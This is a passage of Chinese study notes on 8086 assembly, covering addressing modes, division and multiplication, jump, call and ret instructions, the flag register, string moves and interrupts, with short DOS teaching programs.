di不能够分成两个8位寄存器来使用。\n\n用ds:si指向要复制的源始字符串，用ds:di指向复制的目的空间。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n db 'welcome to masm!'\n db '................'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov si,0\n\t\tmov di,16\t\t;复制到它后面的数据区，后面数据区的偏移地址为16\n\t\t\n\t\tmov cx,8\t\t;一次复制2个字节，一共循环8次\n\ts:\tmov ax,[si]\n\t\tmov [di],ax\n\t\tadd si,2\n\t\tadd di,2\n\t\tloop s\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n利用[bx(si或di)+idata]的方式使程序变简洁：\n\n```asm\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov si,0\n\t\tmov cx,8\n\ts:\tmov ax,0[si]\n\t\tmov 16[si],ax\n\t\tadd si,2\n\t\tloop s\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n## 7.7 [bx+si]和[bx+di]\n\n[bx+si]表示一个内存单元，它的偏移地址为(bx)+(si)，[bx+di]同。\n\nmov ax,[bx+si]->(ax)=((ds)*16+(bx)+(si))\n\nmov ax,[bx+si]=mov ax,[bx\\][si]\n\n## 7.8 [bx+si+idata]和[bx+di+idata]\n\n[bx+si+idata]表示一个内存单元，它的偏移地址为(bx)+(si)+idata，[bx+di+idata]同。\n\nmov ax,[bx+si+idata]->(ax)=((ds)*16+(bx)+(si)+idata)\n\n```asm\n  mov ax,[bx+si+idata]\n= mov ax,idata[bx][si]\n= mov ax,[bx].idata[si]\n= mov ax,[bx][si].idata\n```\n\n## 7.9 不同寻址方式的灵活应用\n\n编程，将datasg段中每个单词首字母改为大写字母(用bx定位每行的起始地址，用3定位要修改的列，用[bx+idata]对目标单元进行寻址)\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb '1..file.........'\t;16个字节\n\tdb '2..edit.........'\n\tdb '3..search.......'\n\tdb '4..view.........'\ndatasg ends\ncodesg segment\nstart: \tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts:  mov al,[bx+3]\n\t\tand al,11011111b\n        mov [bx+3],al\n\t\tadd bx,16\n\t\tloop s\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n编程，将datasg段中每个单词改为大写字母(用bx定位每行的起始地址，用si定位要修改的列，用[bx+si]方式对目标单元进行寻址)\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'ibm.............'\n\tdb 'dec.............'\n\tdb 'dos.............'\n\tdb 'vax.............'\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts0: mov dx,cx\t\t\t;将外层循环的cx值保存在dx中\n\t\tmov si,0\n\t\t\n\t\tmov cx,3\t\t\t;cx设置为内层循环的次数\n\ts:\tmov al,[bx+si]\n\t\tand al,11011111b\n\t\tmov [bx+si],al\n\t\tinc si\n\t\tloop s\n\t\t\n\t\tadd bx,16\n\t\tmov cx,dx\t\t\t;用dx中存放的外层循环的计数值恢复cx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n如果dx也被用了呢？所有寄存器都被用了呢？可以使用内存。\n\n```asm\nassume cs:codesg,ds:datasg\ndatasg segment\n\tdb 'ibm.............'\n\tdb 'dec.............'\n\tdb 'dos.............'\n\tdb 'vax.............'\n\tdw 0\t\t\t\t\t;定义一个字，用来暂存cx\ndatasg ends\ncodesg segment\nstart:\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts0: mov ds:[40h],cx\t\t;将外层循环的cx值保存在datasg:40h单元中\n\t\tmov si,0\n\t\t\n\t\tmov cx,3\t\t\t;cx设置为内层循环的次数\n\ts:\tmov al,[bx+si]\n\t\tand al,11011111b\n\t\tmov [bx+si],al\n\t\tinc si\n\t\tloop s\n\t\t\n\t\tadd bx,16\n\t\tmov cx,ds:[40h]\t\t;用datasg:40h单元中的值恢复cx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n如果需要保存多个数据，需要记住哪个数据暂存在哪个单元中，这样程序容易混乱。一般来说，在需要暂存数据的时候，我们都应该使用栈。\n\n```asm\nassume cs:codesg,ds:datasg,ss:stacksg\ndatasg segment\n\tdb 'ibm.............'\n\tdb 'dec.............'\n\tdb 'dos.............'\n\tdb 'vax.............'\ndatasg ends\nstacksg segment\n\tdw 0,0,0,0,0,0,0,0\nstacksg ends\ncodesg segment\nstart:\tmov ax,stacksg\n\t\tmov ss,ax\n\t\tmov sp,16\n\t\tmov ax,datasg\n\t\tmov ds,ax\n\t\tmov bx,0\n\t\tmov cx,4\n\ts0: push cx\t\t\t\t;将外层循环的cx值压栈\n\t\tmov si,0\n\t\t\n\t\tmov cx,3\t\t\t;cx设置为内层循环的次数\n\ts:\tmov al,[bx+si]\n\t\tand al,11011111b\n\t\tmov [bx+si],al\n\t\tinc si\n\t\tloop s\n\t\t\n\t\tadd bx,16\n\t\tpop cx\t\t\t\t;从栈顶弹出原cx的值恢复cx\n\t\tloop s0\n\t\t\n\t\tmov ax,4c00h\n\t\tint 21h\ncodesg ends\nend start\n```\n\n# 8. 数据处理\n\nreg表示一个寄存器，sreg表示一个段寄存器。\n\nreg有ax, bx, cx, dx, ah, al, bh, bl, ch, cl, dh, dl, sp, bp, si, di\n\nsreg有ds, ss, cs, es\n\n## 8.1 bx, si, di和bp\n\n1. 在8086CPU中又有这4个寄存器可以在“[]”中进行内存单元寻址\n2. 在“[]”中，这4个寄存器可以单个出现，或只能以4种组合出现：bx和si, bx和di, bp和si, bp和di\n\n```asm\nmov ax,[bx]\nmov ax,[bx+si]\nmov ax,[bp+di]\n```\n\n3. 只要在“[]”中使用寄存器bp，而指令中没有显性地给出段地址，段地址就默认在ss中\n\n```asm\nmov ax,[bp]\t\t\t\t(ax)=((ss)*16+(bp))\nmov ax,[bp+si+idata]\t(ax)=((ss)*16+(bp)+(si)+idata)\n```\n\n## 8.2 数据的位置\n\n指令在执行前，所要处理的数据可以在3个地方：CPU内部、内存、端口。\n\n| 汇编指令   | 指令执行前数据的位置 |\n| ---------- | -------------------- |\n| mov bx,[0] | 内存，ds:0单元       |\n| mov bx,ax  | CPU内部，ax寄存器    |\n| mov bx,1   | CPU内部，指令缓冲器  |\n\n### 8.2.1 数据位置的表达\n\n1. 立即数(idata)\n2. 寄存器\n3. 段地址(SA)和偏移地址(EA)\n\n### 8.2.2 寻址方式\n\n![寻址方式小结](F:\\markdown图片\\汇编语言\\寻址方式小结.png)\n\n## 8.3 数据的长度\n\n8086CPU可以处理两种尺寸的数据，byte和word。\n\n1. 通过寄存器名指明要处理的数据的尺寸\n2. 在没有寄存器名存在的情况下，用操作符X ptr指明内存单元的长度，X在汇编指令中可以为word或byte\n\n例如下面的指令中，用word ptr指明了指令访问的内存单元是一个字单元\n\n```asm\nmov word ptr ds:[0],1\ninc word ptr [bx]\n```\n\n下面的指令中，用byte ptr指明了指令访问的内存单元是一个字节单元\n\n```asm\nmov byte ptr ds:[0],1\nadd byte ptr [bx],2\n```\n\n3. 其他方法\n\n有些指令默认了访问的是字单元还是字节单元，比如push [1000H]就不用指明访问的是字单元还是字节单元。因为push指令只进行字操作。\n\n## 8.4 div指令\n\ndiv是除法指令，使用div做除法时应注意以下问题\n\n1. 除数：有8位和16位两种，在一个reg或内存单元中。\n2. 被除数：默认放在AX  或  DX和AX中，如果除数为8位，被除数则为16位，默认在AX中存放；如果除数16位，被除数则为32位，在DX和AX中存放，DX存放高16位，AX存放低16位。\n3. 结果：如果除数为8位，则AL存储除法操作的商，AH存储除法操作的余数；如果除数为16位，则AX存储除法操作的商，DX存储除法操作的余数。\n\n```asm\ndiv reg\ndiv 内存单元\n\ndiv byte ptr ds:[0]\n含义:(al)=(ax)/((ds)*16+0)的商\n\t(ah)=(ax)/((ds)*16+0)的余数\n\t\ndiv word ptr es:[0]\n含义:(ax)=[(dx)*10000H+(ax)]/((es)*16+0)的商\n\t(dx)=[(dx)*10000H+(ax)]/((es)*16+0)的余数\n```\n\n编程，利用除法指令计算100001/100\n\n被除数100001大于65535，不能用ax寄存器存放，所以只能用dx和ax两个寄存器联合存放100001，也就是说要进行16位的除法。除数100小于255，可以在一个8位寄存器中存放，但是因为被除数是32位的，除数应为16位，所以要用一个16位寄存器来存放除数100。\n\n因为要分别为dx和ax赋100001的高16位值和低16位值，所以应先将100001表示为16进制形式：186A1H\n\n```\nmov dx,1\nmov ax,86a1h\t\t;(dx)*10000H+(ax)=100001h\nmov bx,100\ndiv bx\n```\n\n程序执行后，(ax)=03E8H(即1000)，(dx)=1(余数为1)\n\n## 8.5 伪指令dd\n\ndd(double word)双字型数据\n\n用div计算data段中第一个数据除以第二个数据后的结果，商存在第三个数据的存储单元中。\n\n```asm\ndata segment\n\tdd 100001\n\tdw 100\n\tdw 0\ndata ends\ncode segment\n\tmov ax,data\n\tmov ds,ax\n\tmov ax,ds:[0]\t\t;ds:[0]字单元中的低16位存储在ax中\n\tmov dx,ds:[2]\t\t;ds:[2]字单元中的高16位存储在dx中\n\tdiv word ptr ds:[4]\t;用dx:ax中的32位数据除以ds:[4]字单元中的数据\n\tmov ds:[6],ax\t\t;将商存储在ds:[6]字单元中\ncode ends\n```\n\n## 8.6 dup\n\ndup是一个操作符，在汇编语言中同db, dw, dd等一样，也是由编译器识别处理的符号。它是和db, dw, dd等数据定义伪指令配合使用，用来进行数据的重复。\n\n```asm\ndb 3 dup (0)\t\t\t;定义了3个字节,它们的值都是0,相当于db 0,0,0\ndb 3 dup (0,1,2)\t\t;db 0,1,2,0,1,2,0,1,2\ndb 3 dup ('abc','ABC')\n```\n\ndup使用格式\n\n```asm\ndb 重复的次数 dup (重复的字节型数据)\ndw 重复的次数 dup (重复的字型数据)\ndd 重复的次数 dup (重复的双字型数据)\n```\n\n# 9. 转移指令的原理\n\n可以修改IP，或同时修改CS和IP的指令统称为转移指令。转移指令就是可以控制CPU执行内存中某处代码的指令。\n\n8086CPU的转移行为有以下几类\n\n- 只修改IP时，称为段内转移，比如：jmp ax\n- 同时修改CS和IP时，称为段间转移，比如：jmp 1000:0\n\n由于转移指令对IP的修改范围不同，段内转移又分为短转移和近转移\n\n- 短转移IP的修改范围为-128~127\n- 近转移IP的修改范围为-32768~32767\n\n8086CPU的转移指令分为以下几类\n\n- 无条件转移指令(jmp)\n- 条件转移指令\n- 循环指令(loop)\n- 过程\n- 中断\n\n## 9.1 操作符offset\n\n操作符offset在汇编语言中是由编译器处理的符号，它的功能是取得标号的偏移地址。\n\n```asm\nassume cs:codesg\ncodesg segment\nstart:\tmov ax,offset start\t\t;相当于mov ax,0(指令长度为3字节)\n\ts:\tmov ax,offset s\t\t\t;相当于mov ax,3\ncodesg ends\nend start\n```\n\n程序在运行中将s处的一条指令复制到s0处\n\n```asm\nassume cd:codesg\ncodesg segment\ns:\tmov ax,bx\t\t\t;mov ax,bx的机器码占两个字节\n\tmov si,offset s\n\tmov di,offset s0\n\tmov ax,cs:[si]\n\tmov cs:[di],ax\ns0:\tnop\t\t\t\t\t;nop机器码占一个字节\n\tnop\ncodesg ends\nend s\n```\n\n## 9.2 jmp指令\n\njmp为无条件转移指令，可以指修改IP，也可以同时修改CS和IP。\n\njmp指令要给出两种信息：\n\n1. 转移的目的地址\n2. 转移的距离(段间转移、段内短转移、段内近转移)\n\n### 9.2.1 依据位移进行转移的jmp指令\n\n```\njmp short 标号(转到标号处执行指令)：(IP)=(IP)+8位位移\n```\n\n这种格式的jmp指令实现的是段内短转移，它对IP的修改范围为-128~127，向前转移时最多可以越过128个字节，向后转移最多可以越过127个字节。\n\nCPU在执行jmp指令的时候并不需要转移的目的地址。\n\n```asm\nassume cs:codesg\ncodesg segment\nstart:\tmov ax,0\n\t\tjmp short s\n\t\tadd ax,1\n\ts:\tinc ax\ncodesg ends\nend start\n```\n\n```\njmp near ptr 标号：(IP)=(IP)+16位位移\n```\n\n这种格式的jmp指令实现的是段内近转移，它对IP的修改范围为-32768~32767，向前转移时最多可以越过32768个字节，向后转移最多可以越过32767个字节。\n\n### 9.2.2 转移的目的地址在指令中的jmp指令\n\n```\njmp far ptr 标号：(CS)=标号所在段的段地址；(IP)=标号在段中的偏移地址\n```\n\n这种格式的jmp指令实现的是段间转移，又称远转移。far ptr指明了指令用标号的段地址和偏移地址修改CS和IP。\n\n```asm\nassume cs:codesg\ncodesg segment\nstart:\tmov ax,0\n\t\tmov bx,0\n\t\tjmp far ptr s\n\t\tdb 256 dup (0)\n\ts:\tadd ax,1\n\t\tinc ax\ncodesg ends\nend start\n```\n\n### 9.2.3 转移地址在寄存器中的 jmp指令\n\n```\njmp 16位reg：(IP)=(16位reg)\n```\n\n### 9.2.4 转移地址在内存中的jmp指令\n\n转移地址在内存中的jmp指令有两种格式：\n\n1. jmp word ptr 内存单元地址(段内转移)\n\n功能：从内存单元地址处开始存放着一个字，是转移的目的偏移地址。\n\n```asm\nmov ax,0123h\nmov ds:[0],ax\njmp word ptr ds:[0]\n```\n\n执行后，(IP)=0123H\n\n2. jmp dword ptr 内存单元地址(段间转移)\n\n功能：从内存单元地址处开始存放着两个字，高地址处的字是转移的目的段地址，低地址处是转移的目的偏移地址。\n\n(CS)=(内存单元地址+2)，(IP)=(内存单元地址)\n\n```asm\nmov ax,0123h\nmov ds:[0],ax\nmov word ptr ds:[2],0\njmp dword ptr ds:[0]\n```\n\n执行后，(CS)=0，(IP)=0123h，CS:IP指向0000:0123\n\n## 9.3 jcxz指令\n\njcxz指令为有条件转移指令，所有的有条件转移指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127\n\n```\njcxz 标号(如果(cx)=0,转移到标号处执行)：当(cx)=0时，(IP)=(IP)+8位位移\nif((cx)==0) jmp short 标号;\n```\n\n## 9.4 loop指令\n\nloop指令是循环指令，所有的循环指令都是短转移，在对应的机器码中包含转移的位移，而不是目的地址。对IP的修改范围都为-128~127\n\n```\nloop 标号((cx)=(cx)-1,如果(cx)≠0，转移到标号处执行)：如果(cx)≠0,(IP)=(IP)+8位位移\n(cx)--;\nif((cx)!=0) jmp short 标号;\n```\n\n# 10. call和ret指令\n\ncall和ret指令都是转移指令，他们都修改IP，或同时修改CS和IP。它们经常被共同用来实现子程序的设计。\n\n## 10.1 ret和retf\n\nret指令用栈中的数据，修改IP的内容，从而实现近转移；retf指令用栈中的数据，修改CS和IP的内容，从而实现远转移。\n\n### 10.1.1 ret指令\n\nCPU执行ret指令时，进行下面2步操作：\n\n1. (IP)=((SS)*16+(SP))\n2. (SP)=(SP)+2\n\nCPU执行ret指令时相当于进行：\n\n```asm\npop IP\n```\n\n### 10.1.2 retf指令\n\nCPU执行retf指令时，进行下面4步操作：\n\n1. (IP)=((SS)*16+(SP))\n2. (SP)=(SP)+2\n3. (CS)=((SS)*16+(SP))\n4. (SP)=(SP)+2\n\nCPU执行retf指令时相当于进行：\n\n```asm\npop IP\npop CS\n```\n\n## 10.2 call指令\n\nCPU执行call指令时，进行2步操作：\n\n1. 将当前的IP或CS和IP压入栈中\n2. 转移\n\ncall指令不能实现短转移，除此之外，call指令实现转移的方法和jmp指令的原理相同。\n\n### 10.2.1 依据位移进行转移的call指令\n\n```asm\ncall 标号(将当前的IP压栈后，转到标号处执行指令)\n```\n\nCPU执行此种格式的call指令时，进行如下操作：\n\n1. (sp)=(sp)-2\n   ((ss)*16+(sp))=(IP)\n2. (IP)=(IP)+16位位移\n\nCPU执行“call 标号“时，相当于进行：\n\n```asm\npush IP\njmp near ptr 标号\n```\n\n### 10.2.2 转移的目的地址在指令中的call指令\n\n```asm\ncall far ptr 标号\n```\n\n实现的是段间转移。\n\nCPU执行此种格式的call指令时，进行如下操作：\n\n1. (sp)=(sp)-2\n\n   ((ss)*16+(sp))=(CS)\n\n   (sp)=(sp)-2\n\n   ((ss)*16+(sp))=(IP)\n\n2. (CS)=标号所在段的段地址\n\n   (IP)=标号在段中的偏移地址\n\nCPU执行“call far ptr 标号“时，相当于进行：\n\n```asm\npush CS\npush IP\njmp far ptr 标号\n```\n\n### 10.2.3 转移地址在寄存器中的call指令\n\n```asm\ncall 16位reg\n```\n\nCPU执行此种格式的call指令时，进行如下操作：\n\n```asm\n(sp)=(sp)-2\n((ss)*16+(sp))=(IP)\n(IP)=(16位reg)\n```\n\nCPU执行“call 16位reg“时，相当于进行：\n\n```asm\npush IP\njmp 16位reg\n```\n\n### 10.2.4 转移地址在内存中的call指令\n\n转移地址在内存中的call指令有两种格式：\n\n1. call word ptr 内存单元地址\n\nCPU执行“call word ptr 内存单元地址“时，相当于进行：\n\n```asm\npush IP\njmp word ptr 内存单元地址\n```\n\n```asm\nmov sp,10h\nmov ax,0123h\nmov ds:[0],ax\ncall word ptr ds:[0]\n```\n\n执行后，(IP)=0123h，(sp)=0EH\n\n2. call dword ptr 内存单元地址\n\nCPU执行“call dword ptr 内存单元地址“时，相当于进行：\n\n```asm\npush CS\npush IP\njmp dword ptr 内存单元地址\n```\n\n```asm\nmov sp,10h\nmov ax,0123h\nmov ds:[0],ax\nmov word ptr ds:[2],0\ncall dword ptr ds:[0]\n```\n\n执行后，(CS)=0，(IP)=0123H，(sp)=0CH\n\n## 10.3 call和ret的配合使用\n\n```asm\nassume cd:code\ncode segment\nstart:\tmov ax,1\n\t\tmov cx,3\n\t\tcall s\n\t\tmov bx,ax\t\t;(bx)=8\n\t\tmov ax,4c00h\n\t\tint 21h\n\ts:\tadd ax,ax\n\t\tloop s\n\t\tret\ncode ends\nend start\n```\n\n## 10.4 mul指令\n\nmul指令是乘法指令，使用mul做乘法时要注意两点：\n\n1. 两个相乘的数：要么都是8位，要么都是16位。如果是8位，一个默认放在AL中，另一个放在8位reg或内存字节单元中；如果是16位，一个默认放在AX中，另一个放在16位reg或内存字单元中\n2. 结果：如果是8位乘法，结果默认放在AX中；如果是16位乘法，结果高位默认在DX中存放，低位在AX中存放\n\n```asm\nmul reg\nmul 内存单元\n\nmul byte ptr ds:[0]\n含义：(ax)=(al)*((ds)*16+0)\n\nmul word ptr [bx+si+8]\n含义：(ax)=(ax)*((ds)*16+(bx)+(si)+8)结果的低16位\n\t (dx)=(ax)*((ds)*16+(bx)+(si)+8)结果的高16位\n```\n\n计算100*10。(100和10小于255，可以做8位乘法)\n\n```asm\nmov al,100\nmov bl,10\nmul bl\n```\n\n结果：(ax)=1000(03E8H)\n\n计算100*10000。(100小于255，但10000大于255，所以必须做16位乘法)\n\n```asm\nmov ax,100\nmov bx,10000\t\nmul bx\n```\n\n结果：(ax)=4240h，(dx)=000FH（F4240H=1000000）\n\n# 11. 标志寄存器\n\n标志寄存器作用：\n\n1. 用来存储相关指令的某些执行结果\n2. 用来为CPU执行相关指令提供行为依据\n3. 用来控制CPU的相关工作方式\n\nflag和其他寄存器不一样，其他寄存器是用来存放数据的，都是整个寄存器具有一个含义。而flag寄存器是按位起作用的，也就是说，它的每一位都有专门的含义，记录特定的信息。\n\n| 15   | 14   | 13   | 12   | 11   | 10   | 9    | 8    | 7    | 6    | 5    | 4    | 3    | 2    | 1    | 0    |\n| ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n|      |      |      |      | OF   | DF   | IF   | TF   | SF   | ZF   |      | AF   |      | PF   |      | CF   |\n\n8086中flag寄存器只有标注的这些位有特殊的含义，其它8086CPU没有使用。\n\n## 11.1 ZF标志\n\nflag的第6位是ZF，零标志位。它记录相关指令执行后，其结果是否为0。如果为0，ZF=1；否则ZF=0。\n\n```asm\nmov ax,1\nsub ax,1\n```\n\n执行后，(ax)=0，ZF=1\n\n## 11.2 PF标志\n\nflag的第2位是PF，奇偶标志位。它记录相关指令执行后，其结果的所有bit位中1的个数是否为偶数。如果1的个数为偶数，PF=1；否则PF=0。\n\n```asm\nmov al,1\nadd al,10\n```\n\n执行后，结果为11=00001011B，其中有3个1，PF=0\n\n## 11.3 SF标志\n\nflag的第7位是SF，符号标志位。它记录相关指令执行后，其结果是否为负。如果结果为负，SF=1；否则SF=0。\n\n```asm\nmov al,10000001B\t\t;al=-127\nadd al,1\n```\n\n结果：(al)=10000010B，SF=1\n\n## 11.4 CF标志\n\nflag的第0位是CF，进位标志位。一般情况下，在进行**无符号数运算**时，它记录了运算结果的最高有效位向更高位的进位值，或从更高位借位。\n\n|              | 7          | 6    | 5    | 4    | 3    | 2    | 1    | 0    |\n| ------------ | ---------- | ---- | ---- | ---- | ---- | ---- | ---- | ---- |\n|              | 0          | 0    | 0    | 1    | 1    | 1    | 0    | 0    |\n| 假想的更高位 | 最高有效位 |      |      |      |      |      |      |      |\n\n当两数相加时，有可能产生从最高有效位向更高位的进位。CPU在运算的时候，并不丢弃这个进位值，而是记录在一个特殊的寄存器的某一位上。8086CPU就用flag的CF位来记录这个进位值。\n\n```asm\nmov al,98H\nadd al,al\t\t;98h+98h=130h=0001 0011 0000B\n```\n\n执行后，(al)=30H，CF=1，CF记录了从最高有效位向更高位的进位值。\n\n## 11.5 OF标志\n\nflag的第11位是OF，溢出标志位。一般情况下，OF记录了**有符号数运算**的结果是否发生了溢出。如果发生溢出，OF=1；否则OF=0。\n\n对于8位的有符号数据，机器所能表示的范围就是-128\\~127；对于16位的有符号数据，机器所能表示的范围是-32768\\~32767。\n\n```asm\nmov al,0F0H\t\t;0f0h=240=-16\t240-128*2=-16\nadd al,78H\t\t;78h=120=-8\n```\n\n执行后，对于无符号运算，0F0H+78H=168H=0001 0110 1000B，CF=1；对于有符号数，-16-8=-24，OF=0。\n\n## 11.6 adc指令\n\nadc是带进位加法指令，它利用了CF位上记录的进位值。\n\n```asm\nadc 操作对象1,操作对象2\n```\n\n操作对象1=操作对象1+操作对象2+CF\n\n```asm\nmov ax,2\t\t;(ax)=2\nmov bx,1\t\t;(bx)=1\nsub bx,ax\t\t;(bx)=-1=FFFFH\t\tCF=1\nadc ax,1\t\t;(ax)=(ax)+1+CF=4\n```\n\n## 11.7 sbb指令\n\nsbb是带借位减法指令，它利用了CF位上记录的借位值。\n\n```asm\nsbb 操作对象1,操作对象2\n```\n\n操作对象1=操作对象1-操作对象2-CF\n\n```asm\nmov bx,1000H\t\t;(bx)=1000h\nmov ax,003EH\t\t;(ax)=003eh\nsub bx,2000H\t\t;(bx)=1000h-2000h=F000H\t\tCF=1\nsbb ax,0020H\t\t;(ax)=(ax)-20h-1=1D\n```\n\n## 11.8 cmp指令\n\ncmp是比较指令，cmp的功能相当于减法指令，只是不保存结果。cmp指令执行后，将对标志寄存器产生影响。\n\n```asm\ncmp 操作对象1,操作对象2\n```\n\n计算操作对象1-操作对象2但并不保存结果，仅仅根据计算结果对标志寄存器进行设置。\n\n```asm\nmov ax,8\t\t;(ax)=8\nmov bx,3\t\t;(bx)=3\ncmp ax,bx\t\t;(ax)-(bx)=5=0101b\n```\n\n指令执行后，零标志位ZF=0，奇偶标志位PF=1，符号标志位SF=0，进位标志位CF=0，溢出标志位OF=0\n\n如果因为溢出导致了实际结果为负，那么逻辑上真正的结果必然为正；反之亦然。\n\n## 11.9 检测比较结果的条件转移指令\n\n除了jcxz指令外，CPU还提供了其他条件转移指令，大多数条件转移指令都检测标志寄存器的相关标志位，根据检测结果来决定是否修改IP。这些条件转移指令通常和cmp相配合使用，类似call和ret配合。\n\n因为cmp指令可以同时进行两种比较，无符号数比较和有符号数比较，所以根据cmp指令的比较结果进行转移的指令也分为两种，即根据无符号数的比较结果进行转移的条件转移指令(它们检测ZF、CF的值)和根据有符号数的比较结果进行转移的条件转移指令(SF、OF、ZF)。\n\n常用的根据无符号数的比较结果进行转移的条件转移指令\n\n| 指令 | 全称           | 含义         | 检测的相关标志位 |\n| ---- | -------------- | ------------ | ---------------- |\n| je   | jump equal     | 等于则转移   | zf=1             |\n| jne  | jump not equal | 不等于则转移 | zf=0             |\n| jb   | jump below     | 低于则转移   | cf=1             |\n| jnb  | jmp not below  | 不低于则转移 | cf=0             |\n| ja   | jump above     | 高于则转移   | cf=0且zf=0       |\n| jna  | jump not above | 不高于则转移 | cf=1或zf=1       |\n| jz   | jump zero      | 零则转移     | zf=1             |\n| jnz  | jump not zero  | 非零则转移   | zf=0             |\n\n编程统计data段中数值为8的字节的个数，用ax保存统计结果。\n\n```asm\ndata segment\n\tdb 8,11,8,1,8,5,63,38\ndata ends\ncode segment\n\t\tmov ax,data\n\t\tmov ds,ax\n\t\tmov bx,0\t\t\t;ds:bx指向第一个字节\n\t\tmov ax,0\t\t\t;初始化累加器\n\t\tmov cx,8\ns:\t\tcmp byte ptr [bx],8\t;和8进行比较\n\t\tjne next\t\t\t;如果不相等则转到next，继续循环\n\t\tinc ax\t\t\t\t;如果相等将计数加1\nnext:\tinc bx\n\t\tloop s\t\t\t\t;程序执行后(ax)=3\ncode ends\n```\n\n## 11.10 DF标志和串传送指令\n\nflag的第10位是DF，方向标志位。在串处理指令中，控制每次操作后si、di的增减。\n\ndf=0\t每次操作后si、di递增；\n\ndf=1\t每次操作后si、di递减。\n\n### 11.10.1 串传送指令\n\n```asm\nmovsb\n```\n\n执行movsb指令相当于进行下面操作：\n\n1. ((es)*16+(di))=((ds)\\*16+(si))\n\n2. 如果df=0则 (si)=(si)+1;(di)=(di)+1\n\n   如果df=1则 (si)=(si)-1;(di)=(di)-1\n\nmovsb的功能是将ds:si指向的内存单元中的字节送入es:di中，然后根据标志寄存器df的值，将si和递增或递减。\n\n```asm\nmovsw\n```\n\nmovsw的功能是将ds:si指向的内存字单元中的字送入es:di中，然后根据标志寄存器df的值，将si和递增2或递减2。\n\nmovsb和movsw进行的是串传送操作的一个步骤，一般来说，movsb和movsw都和rep配合使用\n\n```asm\nrep movsb\n```\n\n用汇编语法来描述就是\n\n```asm\ns:\tmovsb\n\tloop s\n```\n\nrep的作用是根据cx的值，重复执行后面的串传送指令。由于每执行一次movsb指令si和di都会递增或递减后一个或前一个单元，则rep movsb就可以循环实现(cx)个字符的传送。\n\n由于df位决定着串传送指令执行后si和di改变的方向，所以CPU应该提供相应的指令来对df位进行设置，从而使人能够决定传送的方向。\n\n8086CPU提供下面两条指令对df位进行设置\n\n```asm\ncld指令:将标志寄存器的df位置0\nstd指令:将标志寄存器的df位置1\n```\n\n编程，用串传送指令，将data段中的第一个字符串复制到它后面的空间中。\n\n```asm\ndata segment\n\tdb 'Welcome to masm!'\n\tdb 16 dup (0)\ndata ends\n```\n\n①传送的原始位置：ds:si\tdata:0\n\n②传送的目的位置：es:di\tdata:10h\n\n③传送的长度：cx\t\t\t\t(cx)=16\n\n④传送的方向：df\t\t\t\tdf=1\n\n```asm\nmov ax,data\nmov ds,ax\nmov si,0\t\t\t;ds:si指向data:0\nmov es,ax\nmov di,16\t\t\t;es:di指向data:0010\nmov cx,16\ncld\t\t\t\t\t;df=0,正向传送\nrep movsb\n```\n\n## 11.11 pushf和popf\n\npushf的功能是将标志寄存器的值压栈，popf是从栈中弹出数据，送入标志寄存器中。\n\n# 12. 内中断\n\n任何一个通用的CPU，可以在执行完当前正在执行的指令之后，检测到从CPU外部发送过来或内部产生的一种特殊信息，并且可以立即对所接收到的信息进行处理。中断的意思是CPU不再接着(刚执行完的指令)向下执行，而是转去处理这个特殊信息。\n\n对于8086CPU，当内部有下面的情况发生的时候将产生相应的中断信息：\n\n1. 除法错误，比如执行div指令产生的除法溢出\t0\n2. 单步执行                                                               1\n3. 执行into指令                                                        4\n4. 执行int指令，该指令的格式为int n，指令中的n为字节型立即数，是提供给CPU的中断类型码\n\n## 12.1 中断处理程序\n\nCPU收到中断信息后，应该转去执行该中断信息的处理程序。中断信息中包含有标识中断源的类型码，根据CPU的设计，中断类型码的作用就是用来定位中断处理程序。CPU用8位的中断类型码通过中断向量表找到相应的中断处理程序的入口地址。中断向量表在0000:0000~0000:03FF的1024个单元存放着。在中断向量表中，一个表项占两个字，高地址字存放段地址，低地址字存放偏移地址。\n\n## 12.2 中断过程\n\n用中断类型码找到中断向量，并用它设置CS和IP，这个工作是由CPU的硬件自动完成的。CPU硬件完成这个工作的过程被称为中断过程。\n\n中断过程：\n\n1. (从中断信息中)取得中断类型码N\n2. 标志寄存器的值入栈(因为在中断过程中要改变标志寄存器的值，所以先将其保存在栈中)  pushf\n3. 设置标志寄存器的第8位TF和第9位IF为0  TF=0，IF=0\n4. CS的内容入栈   push CS\n5. IP的内容入栈    push IP\n6. 从内存地址为中断类型码*4 和中断类型码\\*4+2 的两个字单元中读取中断处理程序的入口地址设置IP和CS   (IP)=(N\\*4)，(CS)=(N\\*4+2)\n\n## 12.3 中断处理程序和iret指令\n\n中断处理程序的编写步骤：\n\n1. 保存用到的寄存器\n2. 处理中断\n3. 恢复用到的寄存器\n4. 用iret指令返回\n\niret指令的功能用汇编语法描述：\n\n```asm\npop IP\npop CS\npopf\n```\n\niret指令执行后，CPU回到执行中断处理程序前的执行点继续执行程序。\n\n## 12.4 单步中断\n\nCPU在执行完一条指令后，如果检测到标志寄存器的TF=1，则产生单步中断，引发中断过程。\n\n# 13. int指令\n\nint n也是内中断的一种。\n\n## 13.1 BIOS中断例程\n\nint 